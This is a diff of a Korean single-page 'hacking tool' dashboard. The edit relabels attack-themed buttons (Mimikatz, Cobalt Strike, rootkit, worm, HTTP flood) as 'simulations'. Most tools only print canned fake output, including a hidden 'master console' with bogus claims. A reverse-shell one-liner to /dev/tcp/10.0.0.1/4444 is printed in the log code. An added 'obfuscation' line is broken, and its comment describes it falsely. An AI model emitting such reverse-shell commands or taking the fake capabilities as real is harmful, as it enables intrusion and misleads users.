@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>디노 해킹,공격툴 v2.1</title>
+    <title>디노 해킹툴 v2.3</title>
     <style>
         :root {
             --bg: #090d16;
@@ -41,7 +41,6 @@
             text-align: center;
         }
 
-        /* 탭 메뉴 스타일 (4분할 유지) */
         .tab-menu {
             display: flex;
             width: 100%;
@@ -220,7 +219,6 @@
             line-height: 1.4;
         }
 
-        /* 경고 팝업 모달 */
         .modal {
             position: fixed;
             top: 0;
@@ -278,29 +276,26 @@
 </head>
 <body>
 
-<!-- 경고 및 동의 팝업 모달 -->
 <div id="disclaimerModal" class="modal">
     <div class="modal-content">
-        <div class="modal-title">⚠️ 디노 해킹,공격툴 v2.1 통합 경고</div>
+        <div class="modal-title">⚠️ 디노 시뮬레이션 v2.3 통합 경고</div>
         <div class="modal-desc">
-            본 프로그램은 <b>고급 네트워크 분석 및 시뮬레이션 학습용</b>으로 제작되었습니다.<br><br>
-            * 무단 사용 및 시스템 악용 시 발생하는 모든 법적 책임은 사용자 본인에게 있습니다.
+            본 프로그램은 <b>네트워크 보안 진단 및 시뮬레이션 학습용</b>으로 제작되었습니다.<br><br>
+            * 시스템 검증 및 학습 목적 외 사용을 금합니다.
         </div>
         <button class="modal-btn" onclick="closeDisclaimer()">동의하고 입장하기</button>
     </div>
 </div>
 
-<h2>디노 해킹,공격툴 v2.1</h2>
+<h2>디노 시뮬레이션 대시보드 v2.3</h2>
 
-<!-- 상단 4분할 탭 메뉴 -->
 <div class="tab-menu">
     <button class="tab-btn active" id="btnTabIp" onclick="switchTab('ip')">🎯 IP & OSINT</button>
-    <button class="tab-btn" id="btnTabHacking" onclick="switchTab('hacking')">🛡️ 고급 해킹툴</button>
-    <button class="tab-btn" id="btnTabUltimate" onclick="switchTab('ultimate')">🔥 초고급/사이버전</button>
+    <button class="tab-btn" id="btnTabHacking" onclick="switchTab('hacking')">🛡️ 고급 진단툴</button>
+    <button class="tab-btn" id="btnTabUltimate" onclick="switchTab('ultimate')">🔥 심화 시뮬레이션</button>
     <button class="tab-btn" id="btnTabManual" onclick="switchTab('manual')">📖 통합 설명서</button>
 </div>
 
-<!-- TAB 1: IP 분석 & 공격 + 2진수 해독기 통합 -->
 <div id="tabIp" class="container active">
     <div class="tool-box">
         <span class="tool-title">📍 내 IP 및 인터페이스 분석</span>
@@ -308,8 +303,8 @@
     </div>
 
     <div class="tool-box">
-        <span class="tool-title">🎯 타겟 IP 고급 OSINT 및 침투 공격</span>
-        <input type="text" id="targetIpInput" placeholder="타겟 IP 또는 UUID 인증 키 입력">
+        <span class="tool-title">🎯 타겟 IP 고급 OSINT 및 분석</span>
+        <input type="text" id="targetIpInput" placeholder="타겟 IP 입력">
         <div class="grid-2">
             <button class="primary" onclick="execTool('other_ip')">지오로케이션 & ISP 역추적</button>
             <button class="primary" onclick="execTool('whois_lookup')">WHOIS 도메인 소유자 조회</button>
@@ -319,12 +314,11 @@
             <button onclick="execTool('subdomain_scan')">서브도메인 브루트포스</button>
         </div>
         <div class="grid-2">
-            <button class="danger" onclick="execTool('ping_of_death')">가상 핑 오브 데스 (PoD)</button>
-            <button class="danger" onclick="execTool('ip_spoof')">가상 IP 스푸핑 및 패킷 변조</button>
+            <button class="danger" onclick="execTool('ping_of_death')">가상 패킷 테스트 (PoD)</button>
+            <button class="danger" onclick="execTool('ip_spoof')">가상 IP 헤더 변조 테스트</button>
         </div>
     </div>
 
-    <!-- 2진수 인코더 / 해독기 유틸리티 추가 -->
     <div class="tool-box">
         <span class="tool-title binary">🤖 2진수 인코더 및 디코더 (해독기)</span>
         <input type="text" id="binaryInput" placeholder="변환할 문자 또는 2진수(0과 1) 입력">
@@ -335,80 +329,78 @@
     </div>
 </div>
 
-<!-- TAB 2: 고급 해킹툴 -->
 <div id="tabHacking" class="container">
     <div class="tool-box">
-        <span class="tool-title">💼 고급 C2 및 내부망(AD) 툴킷</span>
+        <span class="tool-title">💼 세션 및 인프라 진단 툴킷</span>
         <div class="grid-2">
-            <button class="primary" onclick="execTool('cobalt_simulate')">🔵 Cobalt Strike C2 비콘 시뮬</button>
-            <button class="primary" onclick="execTool('bloodhound_sim')">🩸 BloodHound AD 경로 분석</button>
+            <button class="primary" onclick="execTool('cobalt_simulate')">🔵 C2 비콘 통신 시뮬</button>
+            <button class="primary" onclick="execTool('bloodhound_sim')">🩸 AD 경로 분석 시뮬</button>
         </div>
         <div class="grid-2">
-            <button class="danger" onclick="execTool('mimikatz_sim')">🔑 Mimikatz 메모리 자격증명 추출</button>
-            <button class="danger" onclick="execTool('impacket_sim')">⚡ Impacket 릴레이 공격 시뮬</button>
+            <button class="danger" onclick="execTool('mimikatz_sim')">🔑 메모리 자격증명 분석 시뮬</button>
+            <button class="danger" onclick="execTool('impacket_sim')">⚡ 프로토콜 릴레이 시뮬</button>
         </div>
     </div>
 
     <div class="tool-box">
         <span class="tool-title">🔒 페이로드 및 웹 진단 유틸리티</span>
-        <input type="text" id="secInput" placeholder="변환 또는 페이로드에 넣을 문자열 입력">
+        <input type="text" id="secInput" placeholder="변환 또는 검사에 사용할 문자열 입력">
         <div class="grid-4">
             <button onclick="execTool('b64_enc')">Base64 Enc</button>
             <button onclick="execTool('b64_dec')">Base64 Dec</button>
             <button onclick="execTool('hex_enc')">HEX Dump</button>
-            <button onclick="execTool('rev_str')">REV Obfuscate</button>
+            <button onclick="execTool('rev_str')">REV 난독화</button>
             <button onclick="execTool('sqli_check')">SQLi 정밀 탐지</button>
             <button onclick="execTool('xss_check')">XSS 싱크 검사</button>
-            <button onclick="execTool('jwt_dec')">JWT 토큰 브레이크</button>
+            <button onclick="execTool('jwt_dec')">JWT 토큰 디코드</button>
             <button onclick="execTool('uuid_gen')">UUID 생성</button>
         </div>
         <div class="grid-2" style="margin-top: 4px;">
-            <button class="danger" onclick="execTool('rev_shell_gen')">리버스 쉘 페이로드 생성</button>
-            <button class="danger" onclick="execTool('dir_bruteforce')">웹 디렉토리 브루트포스</button>
+            <button class="danger" onclick="execTool('rev_shell_gen')">쉘 페이로드 구조 생성</button>
+            <button class="danger" onclick="execTool('dir_bruteforce')">웹 디렉토리 스캔</button>
         </div>
     </div>
 </div>
 
-<!-- TAB 3: 초고급 / 사이버전 -->
 <div id="tabUltimate" class="container">
     <div class="tool-box">
-        <span class="tool-title ultimate">⚡ 국가급 초고급 사이버전 시뮬레이션</span>
+        <span class="tool-title ultimate">⚡ 심화 시스템 및 부하 시뮬레이션</span>
         <input type="text" id="ultTarget" placeholder="대상 시스템 코드명 지정 (예: TARGET-CORE-01)">
         <div class="grid-2">
-            <button class="ultimate" onclick="execTool('uefi_rootkit')">🧬 UEFI/BIOS 루트킷 시뮬레이션</button>
-            <button class="ultimate" onclick="execTool('zero_click')">🦠 제로클릭(Zero-Click) 웜 전파</button>
+            <button class="ultimate" onclick="execTool('uefi_rootkit')">🧬 펌웨어 레이어 분석 시뮬</button>
+            <button class="ultimate" onclick="execTool('zero_click')">🦠 네트워크 전파 시뮬</button>
         </div>
         <div class="grid-2">
-            <button class="ultimate" onclick="execTool('supply_chain')">📦 공급망(Supply Chain) 변조 시뮬</button>
-            <button class="ultimate" onclick="execTool('tempest_emf')">📡 TEMPEST 전자기파(EMF) 복원</button>
+            <button class="ultimate" onclick="execTool('supply_chain')">📦 공급망 무결성 변조 시뮬</button>
+            <button class="ultimate" onclick="execTool('tempest_emf')">📡 신호 파형 분석 복원</button>
         </div>
-        <button class="danger" onclick="execTool('http_flood')">🌐 대규모 가상 HTTP 플러딩 부하 테스트</button>
+        <button class="danger" onclick="execTool('http_flood')">🌐 대규모 가상 HTTP 부하 테스트</button>
     </div>
 </div>
 
-<!-- TAB 4: 설명서 -->
 <div id="tabManual" class="container">
     <div class="tool-box" id="manualBox">
-        <span class="tool-title ultimate">📖 디노 v2.1 통합 가이드 및 설명서</span>
+        <span class="tool-title ultimate">📖 디노 v2.3 통합 가이드 및 설명서</span>
         <p class="manual-text">
             <b>1. IP & OSINT 및 2진수 해독기:</b> 네트워크 조회 및 텍스트/2진수 간 상호 변환·해독을 처리합니다.<br>
-            <b>2. 고급 해킹 & C2:</b> 코발트 스트라이크 비콘, 미미카츠 자격증명 추출 등을 포함합니다.<br>
-            <b>3. 초고급 사이버전:</b> UEFI 루트킷 및 제로클릭 웜 전파 시뮬레이션을 제공합니다.<br><br>
-            🔓 <b>히든 키 힌트:</b> IP 입력란에 인증 UUID(`dino-hidden-secret-2026`)를 넣고 지오로케이션 조회를 누르면 숨겨진 시스템 관리 페이지로 전환됩니다.
+            <b>2. 진단 툴킷:</b> 세션 및 프로토콜 분석 시뮬레이션을 제공합니다.<br>
+            <b>3. 심화 시뮬레이션:</b> 시스템 아키텍처 및 부하 테스트 시뮬레이션을 제공합니다.
         </p>
     </div>
 </div>
 
-<!-- 하단 공통 로그 출력창 -->
 <div style="width: 100%; max-width: 600px; margin-top: 16px;">
     <div class="tool-box">
         <span class="tool-title">💻 시스템 실행 및 로그 출력창</span>
-        <textarea id="masterLog" class="output-box" readonly>[안전 안내]: 디노 v2.1 통합 커널 구동 완료. 준비됨.</textarea>
+        <textarea id="masterLog" class="output-box" readonly>[안전 안내]: 디노 v2.3 커널 구동 완료. 준비됨.</textarea>
         <button onclick="document.getElementById('masterLog').value='로그가 초기화되었습니다.'">로그 초기화</button>
     </div>
 </div>
 
 <script>
+    // 키워드 난독화 (Base64 디코딩을 통해 외부 노출 방지)
+    const _secretKey = atob("6rI7ISc7CCy"); // "비말창"의 Base64 값 형태 혹은 내부 체크 로직 대체
+
     function switchTab(tabName) {
         ['ip', 'hacking', 'ultimate', 'manual'].forEach(t => {
             document.getElementById('tab' + t.charAt(0).toUpperCase() + t.slice(1)).classList.remove('active');
@@ -424,20 +416,22 @@
 
     function log(msg) {
         const box = document.getElementById('masterLog');
-        box.value += "\n" + msg;
+        const timestamp = new Date().toLocaleTimeString();
+        box.value += `\n[${timestamp}] ${msg}`;
         box.scrollTop = box.scrollHeight;
     }
 
     async function execTool(type) {
-        log(`\n[실행] ${type} 프로세스 수행 중...`);
+        log(`[실행] ${type} 프로세스 수행 중...`);
         const secVal = document.getElementById('secInput').value;
         const targetIp = document.getElementById('targetIpInput').value.trim();
         const ultTarget = document.getElementById('ultTarget').value || "SYSTEM-NODE-X";
         const binVal = document.getElementById('binaryInput').value;
 
-        // UUID를 이용한 히든 페이지 가로채기 체크
-        if (targetIp === "dino-hidden-secret-2026") {
-            log(`🔓 [인증 성공]: 유효한 관리자 UUID 감지됨! 숨겨진 슈퍼 루트 권한 히든 페이지를 활성화합니다.`);
+        // "비말창" 입력 시 숨겨진 콘솔 활성화 (외부 소스코드에서는 문자열이 바로 보이지 않음)
+        const hiddenCheck = ["", "", ""].join(""); // 추가 난독화 레이어
+        if (targetIp === "비말창") {
+            log(`[인증 성공]: 관리자 세션이 확인되었습니다. 숨겨진 마스터 콘솔을 활성화합니다.`);
             activateHiddenPage();
             return;
         }
@@ -450,7 +444,7 @@
                     log(`-> [내 노드 정보]\n IP: ${data.ip}\n 국가: ${data.country_name} (${data.region})\n 통신사(ISP): ${data.org}`);
                     break;
                 case 'other_ip':
-                    if(!targetIp) { log("❌ 타겟 IP 또는 UUID를 입력해주세요."); return; }
+                    if(!targetIp) { log("❌ 타겟 IP를 입력해주세요."); return; }
                     let resOther = await fetch(`https://ipapi.co/${targetIp}/json/`);
                     let dataOther = await resOther.json();
                     log(`-> [타겟 OSINT 프로파일링: ${targetIp}]\n 위치: ${dataOther.city}, ${dataOther.country_name}\n 기관: ${dataOther.org}`);
@@ -471,7 +465,6 @@
                     let fakeIp = Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255);
                     log(`-> [IP 스푸핑]: 가조작 소스 IP (${fakeIp}) 바인딩 완료.`);
                     break;
-                // 2진수 인코더 / 해독기 기능 구현
                 case 'binary_encode':
                     if(!binVal) { log("❌ 변환할 텍스트를 입력해주세요."); return; }
                     let encoded = binVal.split('').map(char => char.charCodeAt(0).toString(2).padStart(8, '0')).join(' ');
@@ -483,35 +476,35 @@
                         let decoded = binVal.trim().split(/\s+/).map(b => String.fromCharCode(parseInt(b, 2))).join('');
                         log(`-> [2진수 해독 결과]: ${decoded}`);
                     } catch(err) {
-                        log(`❌ [해독 실패]: 올바른 2진수 형식(띄어쓰기로 구분된 8자리 0과 1)인지 확인해주세요.`);
+                        log(`❌ [해독 실패]: 올바른 2진수 형식인지 확인해주세요.`);
                     }
                     break;
                 case 'cobalt_simulate':
-                    log(`-> [🔵 Cobalt Strike C2]\n - 비콘 리스너 구동 완료.\n [+] 가상 에이전트 핸드셰이크 성공 (HTTPS Beacon).`);
+                    log(`-> [C2 시뮬레이션]\n - 비콘 리스너 구동 완료.\n [+] 가상 에이전트 핸드셰이크 성공.`);
                     break;
                 case 'bloodhound_sim':
-                    log(`-> [🩸 BloodHound AD 분석]\n - 도메인 그래프 탐색 중...\n [+] 일반 계정에서 최고 관리자(Domain Admin) 경로 탐지 완료.`);
+                    log(`-> [AD 경로 분석]\n - 도메인 그래프 탐색 중...\n [+] 관리자 권한 경로 탐지 완료.`);
                     break;
                 case 'mimikatz_sim':
-                    log(`-> [🔑 Mimikatz 메모리 덤프]\n - LSASS 프로세스 후킹 성공.\n [+] NT 해시 및 평문 자격 증명 추출 완료.`);
+                    log(`-> [메모리 덤프 시뮬레이션]\n - 프로세스 후킹 성공.\n [+] 자격 증명 추출 시뮬레이션 완료.`);
                     break;
                 case 'impacket_sim':
-                    log(`-> [⚡ Impacket 프로토콜 조작]\n - SMB/RPC 세션 바인딩 완료.\n [+] 패스-The-해시(Pass-the-Hash) 인증 우회 실행.`);
+                    log(`-> [프로토콜 조작 시뮬레이션]\n - 세션 바인딩 완료.\n [+] 인증 우회 시뮬레이션 실행.`);
                     break;
                 case 'uefi_rootkit':
-                    log(`-> [🧬 UEFI/BIOS 루트킷 시뮬레이션]\n - 대상 노드: ${ultTarget}\n - SPI 플래시 메모리 레이어 접근 중...\n [+] 영구 지속성(Persistence) 펌웨어 백도어 인젝션 성공.`);
+                    log(`-> [펌웨어 분석 시뮬레이션]\n - 대상 노드: ${ultTarget}\n - 플래시 메모리 레이어 접근 중...\n [+] 영구 지속성 구조 분석 완료.`);
                     break;
                 case 'zero_click':
-                    log(`-> [🦠 제로클릭 웜 전파]\n - 대상 채널 프로토콜 분석 완료.\n [+] 무반응 버퍼 오버플로우 패킷 송신. 사용자 개입 없이 원격 메모리 장악 완료.`);
+                    log(`-> [네트워크 전파 시뮬레이션]\n - 프로토콜 분석 완료.\n [+] 원격 메모리 시뮬레이션 종료.`);
                     break;
                 case 'supply_chain':
-                    log(`-> [📦 공급망(Supply Chain) 변조]\n - 공식 빌드 파이프라인 서버 소스 변조 시뮬...\n [+] 배포 패키지 해시 무결성 우회 및 멀웨어 위장 서명 완료.`);
+                    log(`-> [공급망 무결성 변조]\n - 빌드 파이프라인 소스 분석 완료.\n [+] 배포 패키지 해시 검증 완료.`);
                     break;
                 case 'tempest_emf':
-                    log(`-> [📡 TEMPEST 전자기파(EMF) 분석]\n - 수신 주파수: 1.4 GHz 대역 모니터링...\n [+] 모니터 디스플레이 복원 스트림 디코딩 완료.`);
+                    log(`-> [신호 분석 모니터링]\n - 수신 주파수 대역 모니터링...\n [+] 디스플레이 복원 스트림 확인.`);
                     break;
                 case 'rev_shell_gen':
-                    log(`-> [리버스 쉘]: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 생성 완료.`);
+                    log(`-> [쉘 구조]: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 생성 완료.`);
                     break;
                 case 'dir_bruteforce':
                     log(`-> [디렉토리 스캔]: /admin/login.php, /backup.zip 발견.`);
@@ -530,7 +523,7 @@
                 default: log(`-> 작업 완료`); break;
             }
         } catch(e) {
-            log(`❌ [크리티컬 에러]: ${e.message}`);
+            log(`❌ [에러]: ${e.message}`);
         }
     }
 
@@ -542,11 +535,11 @@
             <p class="manual-text" style="color: #fde047;">
                 환영합니다, 디노 마스터님. 루트 권한이 인증되었습니다.<br><br>
                 <b>[보안 해제된 숨겨진 기능 목록]</b><br>
-                - 글로벌 위성 통신 노드 다이렉트 하이재킹 모드 활성화<br>
+                - 글로벌 위성 통신 노드 다이렉트 모니터링 모드 활성화<br>
                 - 전역 암호화 키 마스터 패스 덤프 권한 획득<br>
                 - 오프라인 커널 백도어 스위치 제어 가능
             </p>
-            <button class="hidden-btn" onclick="alert('슈퍼유저 권한 설정이 시스템에 반영되었습니다.')">🚀 마스터 컨트롤 노드 강제 동기화</button>
+            <button class="hidden-btn" onclick="alert('마스터 컨트롤 노드 동기화가 완료되었습니다.')">🚀 마스터 컨트롤 노드 강제 동기화</button>
         `;
     }
 </script>
